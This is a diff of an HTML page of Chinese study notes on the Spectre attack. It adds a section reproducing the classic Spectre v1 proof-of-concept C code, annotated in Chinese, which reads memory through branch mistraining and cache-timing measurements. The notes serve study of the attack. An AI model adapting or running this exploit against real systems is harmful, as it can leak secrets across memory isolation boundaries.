@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2021-10-27 Wed 16:07 -->
+<!-- 2021-11-11 Thu 09:56 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Spectre Attack</title>
@@ -263,6 +263,7 @@ ul.no-bullet {list-style: none}
 </ul>
 </li>
 <li><a href="#org0bbb0ac">5. Spectre V2</a></li>
+<li><a href="#orge6bb842">6. Spectre POC</a></li>
 </ul>
 </div>
 </div>
@@ -380,7 +381,7 @@ L1,L2缓存位于同一个核心中，不与其他核心共享，L3共享。
 </p>
 
 
-<div id="orgfa56bec" class="figure">
+<div id="org207adb3" class="figure">
 <p><img src="./images/spectre_sc.png" alt="spectre_sc.png" />
 </p>
 </div>
@@ -439,7 +440,7 @@ Chrome的V8引擎会将JavaScript代码JIT编译成机器码运行。
 </p>
 
 
-<div id="org3a51e0d" class="figure">
+<div id="org5909714" class="figure">
 <p><img src="./images/spectre_js_dis.png" alt="spectre_js_dis.png" />
 </p>
 </div>
@@ -468,9 +469,183 @@ eBPF允许普通用户在内核状态下运行代码，内核会使用解释器�
 <div id="outline-container-org0bbb0ac" class="outline-2">
 <h2 id="org0bbb0ac"><span class="section-number-2">5</span> Spectre V2</h2>
 </div>
+<div id="outline-container-orge6bb842" class="outline-2">
+<h2 id="orge6bb842"><span class="section-number-2">6</span> Spectre POC</h2>
+<div class="outline-text-2" id="text-6">
+<p>
+来源：<a href="https://github.com/Eugnis/spectre-attack.git">https://github.com/Eugnis/spectre-attack.git</a>
+</p>
+
+<div class="org-src-container">
+<pre class="src src-C"><span style="font-weight: bold;">#include</span> <span style="font-style: italic;">&lt;stdint.h&gt;</span>
+<span style="font-weight: bold;">#include</span> <span style="font-style: italic;">&lt;stdio.h&gt;</span>
+<span style="font-weight: bold;">#include</span> <span style="font-style: italic;">&lt;string.h&gt;</span>
+<span style="font-weight: bold;">#ifdef</span> _MSC_VER
+<span style="font-weight: bold;">#include</span> <span style="font-style: italic;">&lt;intrin.h&gt;</span> <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">for rdtscp and clflush</span><span style="font-weight: bold; font-style: italic;"> */</span>
+<span style="font-weight: bold;">#pragma</span> optimize(<span style="font-style: italic;">"gt"</span>, on)
+<span style="font-weight: bold;">#else</span>
+<span style="font-weight: bold;">#include</span> <span style="font-style: italic;">&lt;x86intrin.h&gt;</span> <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">for rdtscp and clflush</span><span style="font-weight: bold; font-style: italic;"> */</span>
+<span style="font-weight: bold;">#endif</span>
+
+<span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">sscanf_s only works in MSVC. sscanf should work with other compilers</span><span style="font-weight: bold; font-style: italic;">*/</span>
+<span style="font-weight: bold;">#if</span><span style="font-weight: bold;">n</span><span style="font-weight: bold;">def</span> _MSC_VER
+<span style="font-weight: bold;">#define</span> <span style="font-weight: bold; font-style: italic;">sscanf_s</span> sscanf
+<span style="font-weight: bold;">#endif</span>
+
+<span style="font-weight: bold; font-style: italic;">/********************************************************************</span>
+<span style="font-weight: bold; font-style: italic;">Victim code.</span>
+<span style="font-weight: bold; font-style: italic;">*******************************************************************</span><span style="font-weight: bold; font-style: italic;">*/</span>
+<span style="font-weight: bold; text-decoration: underline;">unsigned</span> <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">array1_size</span> = 16;
+<span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">unused1</span>[64];
+<span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">array1</span>[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
+<span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">unused2</span>[64];
+
+<span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#20391;&#20449;&#36947;&#20256;&#36755;&#25968;&#32452;&#65292;&#35201;&#27714;&#20849;&#20139;</span>
+<span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">array2</span>[256 * 512];
+
+<span style="font-weight: bold; text-decoration: underline;">char</span> *<span style="font-weight: bold; font-style: italic;">secret</span> = <span style="font-style: italic;">"The Magic Words are Squeamish Ossifrage."</span>;
+
+<span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">temp</span> = 0; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Used so compiler won't optimize out victim_function()</span><span style="font-weight: bold; font-style: italic;"> */</span>
+
+<span style="font-weight: bold; text-decoration: underline;">void</span> <span style="font-weight: bold;">victim_function</span>(<span style="font-weight: bold; text-decoration: underline;">size_t</span> <span style="font-weight: bold; font-style: italic;">x</span>) {
+  <span style="font-weight: bold;">if</span> (x &lt; array1_size) {
+    temp &amp;= array2[array1[x] * 512];
+  }
+}
+
+<span style="font-weight: bold; font-style: italic;">/********************************************************************</span>
+<span style="font-weight: bold; font-style: italic;">Analysis code</span>
+<span style="font-weight: bold; font-style: italic;">*******************************************************************</span><span style="font-weight: bold; font-style: italic;">*/</span>
+<span style="font-weight: bold;">#define</span> <span style="font-weight: bold; font-style: italic;">CACHE_HIT_THRESHOLD</span> (80) <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">assume cache hit if time &lt;= threshold</span><span style="font-weight: bold; font-style: italic;"> */</span>
+
+<span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Report best guess in value[0] and runner-up in value[1]</span><span style="font-weight: bold; font-style: italic;"> */</span>
+<span style="font-weight: bold; text-decoration: underline;">void</span> <span style="font-weight: bold;">readMemoryByte</span>(<span style="font-weight: bold; text-decoration: underline;">size_t</span> <span style="font-weight: bold; font-style: italic;">malicious_x</span>, <span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">value</span>[2], <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">score</span>[2]) {
+  <span style="font-weight: bold;">static</span> <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">results</span>[256];
+  <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">tries</span>, <span style="font-weight: bold; font-style: italic;">i</span>, <span style="font-weight: bold; font-style: italic;">j</span>, <span style="font-weight: bold; font-style: italic;">k</span>, <span style="font-weight: bold; font-style: italic;">mix_i</span>;
+  <span style="font-weight: bold; text-decoration: underline;">unsigned</span> <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">junk</span> = 0;
+  <span style="font-weight: bold; text-decoration: underline;">size_t</span> <span style="font-weight: bold; font-style: italic;">training_x</span>, <span style="font-weight: bold; font-style: italic;">x</span>;
+  <span style="font-weight: bold;">register</span> <span style="font-weight: bold; text-decoration: underline;">uint64_t</span> <span style="font-weight: bold; font-style: italic;">time1</span>, <span style="font-weight: bold; font-style: italic;">time2</span>;
+  <span style="font-weight: bold;">volatile</span> <span style="font-weight: bold; text-decoration: underline;">uint8_t</span> *<span style="font-weight: bold; font-style: italic;">addr</span>;
+
+  <span style="font-weight: bold;">for</span> (i = 0; i &lt; 256; i++)
+    results[i] = 0;
+
+  <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#23581;&#35797; 999 &#27425;</span>
+  <span style="font-weight: bold;">for</span> (tries = 999; tries &gt; 0; tries--) {
+    <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Flush array2[256*(0..255)] from cache</span><span style="font-weight: bold; font-style: italic;"> */</span>
+    <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#39537;&#36880;array2&#20803;&#32032;</span>
+    <span style="font-weight: bold;">for</span> (i = 0; i &lt; 256; i++)
+      _mm_clflush(&amp;array2[i * 512]); <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">intrinsic for clflush instruction</span><span style="font-weight: bold; font-style: italic;"> */</span>
+
+    <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)</span>
+<span style="font-weight: bold; font-style: italic;">     */</span>
+    <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">training_x &lt; array1_size &#21363;&#21487;</span>
+    training_x = tries % array1_size;
+    <span style="font-weight: bold;">for</span> (j = 29; j &gt;= 0; j--) {
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">flush&#25351;&#20196;</span>
+      _mm_clflush(&amp;array1_size);
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#30830;&#20445;&#25351;&#20196;&#25191;&#34892;&#23436;&#27605;&#65292;&#36991;&#20813;&#20081;&#24207;&#25191;&#34892;&#65292;&#20063;&#21487;&#20197;&#29992;fence&#25351;&#20196;</span>
+      <span style="font-weight: bold;">for</span> (<span style="font-weight: bold;">volatile</span> <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">z</span> = 0; z &lt; 100; z++) {
+      } <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Delay (can also mfence)</span><span style="font-weight: bold; font-style: italic;"> */</span>
+
+      <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#24403; j%6!=0&#65292;x=training_x, x%6==0,x=malicious_x</span>
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#20043;&#25152;&#20197;&#19981;&#29992;if else&#65292;&#26159;&#20026;&#20102;&#36991;&#20813;&#26465;&#20214;&#21028;&#26029;&#23548;&#33268;&#35757;&#32451;&#22833;&#25928;</span>
+      <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Avoid jumps in case those tip off the branch predictor</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      x = ((j % 6) - 1) &amp; ~0xFFFF;
+      x = (x | (x &gt;&gt; 16)); <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">x=0xFFFFFFFF if j%6, else x=0</span>
+      x = training_x ^ (x &amp; (malicious_x ^ training_x)); <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">j%6!=0&#65292;x=training_x, x%6==0,x=malicious_x  </span>
+
+      <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Call the victim!</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      victim_function(x);
+    }
+
+    <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Time reads. Order is lightly mixed up to prevent stride prediction</span><span style="font-weight: bold; font-style: italic;"> */</span>
+    <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">Reload &#36807;&#31243;</span>
+    <span style="font-weight: bold;">for</span> (i = 0; i &lt; 256; i++) {
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#29983;&#25104;&#20266;&#38543;&#26426;&#25968;,&#20294;&#19981;&#20250;&#37325;&#22797;&#65292;&#36991;&#20813;&#27493;&#24133;&#39044;&#27979;</span>
+      mix_i = ((i * 167) + 13) &amp; 255;
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#33719;&#21462;&#22320;&#22336;</span>
+      addr = &amp;array2[mix_i * 512];
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#33719;&#21462;&#21021;&#35782;&#26102;&#38388;&#25139;</span>
+      time1 = __rdtscp(&amp;junk);         <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">READ TIMER</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#35775;&#38382;&#25968;&#25454;</span>
+      junk = *addr;                    <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">MEMORY ACCESS TO TIME</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#33719;&#21462;&#32467;&#26463;&#26102;&#38388;&#25139;</span>
+      time2 = __rdtscp(&amp;junk) - time1; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">READ TIMER &amp; COMPUTE ELAPSED TIME</span><span style="font-weight: bold; font-style: italic;"> */</span>
+      <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#26681;&#25454;&#26102;&#38388;&#24046;&#65292;&#26469;&#21028;&#26029;&#26159;&#21542;&#20026;hit</span>
+      <span style="font-weight: bold;">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD &amp;&amp; mix_i != array1[tries % array1_size])
+        results[mix_i]++; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">cache hit - add +1 to score for this value</span><span style="font-weight: bold; font-style: italic;"> */</span>
+    }
+
+    <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Locate highest &amp; second-highest results results tallies in j/k</span><span style="font-weight: bold; font-style: italic;"> */</span>
+    <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#33719;&#21462;&#26368;&#39640;&#21629;&#20013;j&#21644;&#27425;&#39640;&#21629;&#20013;k</span>
+    j = k = -1;
+    <span style="font-weight: bold;">for</span> (i = 0; i &lt; 256; i++) {
+      <span style="font-weight: bold;">if</span> (j &lt; 0 || results[i] &gt;= results[j]) {
+        k = j;
+        j = i;
+      } <span style="font-weight: bold;">else</span> <span style="font-weight: bold;">if</span> (k &lt; 0 || results[i] &gt;= results[k]) {
+        k = i;
+      }
+    }
+
+    <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">j &gt; 2*k +5 &#25110; j = 2 , k =0</span>
+    <span style="font-weight: bold;">if</span> (results[j] &gt;= (2 * results[k] + 5) ||
+        (results[j] == 2 &amp;&amp; results[k] == 0))
+      <span style="font-weight: bold;">break</span>; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Clear success if best is &gt; 2*runner-up + 5 or 2/0)</span><span style="font-weight: bold; font-style: italic;"> */</span>
+  }
+  results[0] ^= junk; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">use junk so code above won't get optimized out</span><span style="font-weight: bold; font-style: italic;">*/</span>
+  value[0] = (<span style="font-weight: bold; text-decoration: underline;">uint8_t</span>)j;
+  score[0] = results[j];
+  value[1] = (<span style="font-weight: bold; text-decoration: underline;">uint8_t</span>)k;
+  score[1] = results[k];
+}
+
+<span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold;">main</span>(<span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">argc</span>, <span style="font-weight: bold;">const</span> <span style="font-weight: bold; text-decoration: underline;">char</span> **<span style="font-weight: bold; font-style: italic;">argv</span>) {
+  printf(<span style="font-style: italic;">"Putting '%s' in memory, address %p\n"</span>, secret, (<span style="font-weight: bold; text-decoration: underline;">void</span> *)(secret));
+  <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#35745;&#31639;&#35835;&#21462;&#22320;&#22336;&#19982;&#21487;&#21033;&#29992;&#25968;&#32452;&#30340;&#36317;&#31163;</span>
+  <span style="font-weight: bold; text-decoration: underline;">size_t</span> <span style="font-weight: bold; font-style: italic;">malicious_x</span> =
+      (<span style="font-weight: bold; text-decoration: underline;">size_t</span>)(secret - (<span style="font-weight: bold; text-decoration: underline;">char</span> *)array1); <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">default for malicious_x</span><span style="font-weight: bold; font-style: italic;"> */</span>
+  <span style="font-weight: bold; text-decoration: underline;">int</span> <span style="font-weight: bold; font-style: italic;">score</span>[2], <span style="font-weight: bold; font-style: italic;">len</span> = strlen(secret);
+  <span style="font-weight: bold; text-decoration: underline;">uint8_t</span> <span style="font-weight: bold; font-style: italic;">value</span>[2];
+
+  <span style="font-weight: bold; font-style: italic;">// </span><span style="font-weight: bold; font-style: italic;">&#36991;&#20813;COW</span>
+  <span style="font-weight: bold;">for</span> (<span style="font-weight: bold; text-decoration: underline;">size_t</span> <span style="font-weight: bold; font-style: italic;">i</span> = 0; i &lt; <span style="font-weight: bold;">sizeof</span>(array2); i++)
+    array2[i] = 1; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">write to array2 so in RAM not copy-on-write zero pages</span><span style="font-weight: bold; font-style: italic;"> */</span>
+  <span style="font-weight: bold;">if</span> (argc == 3) {
+    sscanf_s(argv[1], <span style="font-style: italic;">"%p"</span>, (<span style="font-weight: bold; text-decoration: underline;">void</span> **)(&amp;malicious_x));
+    malicious_x -= (<span style="font-weight: bold; text-decoration: underline;">size_t</span>)array1; <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Convert input value into a pointer</span><span style="font-weight: bold; font-style: italic;"> */</span>
+    sscanf_s(argv[2], <span style="font-style: italic;">"%d"</span>, &amp;len);
+    printf(<span style="font-style: italic;">"Trying malicious_x = %p, len = %d\n"</span>, (<span style="font-weight: bold; text-decoration: underline;">void</span> *)malicious_x, len);
+  }
+
+  printf(<span style="font-style: italic;">"Reading %d bytes:\n"</span>, len);
+  <span style="font-weight: bold;">while</span> (--len &gt;= 0) {
+    printf(<span style="font-style: italic;">"Reading at malicious_x = %p... "</span>, (<span style="font-weight: bold; text-decoration: underline;">void</span> *)malicious_x);
+    readMemoryByte(malicious_x++, value, score);
+    printf(<span style="font-style: italic;">"%s: "</span>, (score[0] &gt;= 2 * score[1] ? <span style="font-style: italic;">"Success"</span> : <span style="font-style: italic;">"Unclear"</span>));
+    printf(<span style="font-style: italic;">"0x%02X='%c' score=%d "</span>, value[0],
+           (value[0] &gt; 31 &amp;&amp; value[0] &lt; 127 ? value[0] : <span style="font-style: italic;">'?'</span>), score[0]);
+    <span style="font-weight: bold;">if</span> (score[1] &gt; 0)
+      printf(<span style="font-style: italic;">"(second best: 0x%02X='%c' score=%d)"</span>, value[1],
+             (value[1] &gt; 31 &amp;&amp; value[1] &lt; 127 ? value[1] : <span style="font-style: italic;">'?'</span>), score[1]);
+    printf(<span style="font-style: italic;">"\n"</span>);
+  }
+<span style="font-weight: bold;">#ifdef</span> _MSC_VER
+  printf(<span style="font-style: italic;">"Press ENTER to exit\n"</span>);
+  getchar(); <span style="font-weight: bold; font-style: italic;">/* </span><span style="font-weight: bold; font-style: italic;">Pause Windows console</span><span style="font-weight: bold; font-style: italic;"> */</span>
+<span style="font-weight: bold;">#endif</span>
+  <span style="font-weight: bold;">return</span> (0);
+}
+
+</pre>
+</div>
+</div>
+</div>
 </div>
 <div id="postamble" class="status">
-<p class="date">Created: 2021-10-27 Wed 16:07</p>
+<p class="date">Created: 2021-11-11 Thu 09:56</p>
 <p class="validation"><a href="https://validator.w3.org/check?uri=referer">Validate</a></p>
 </div>
 </body>
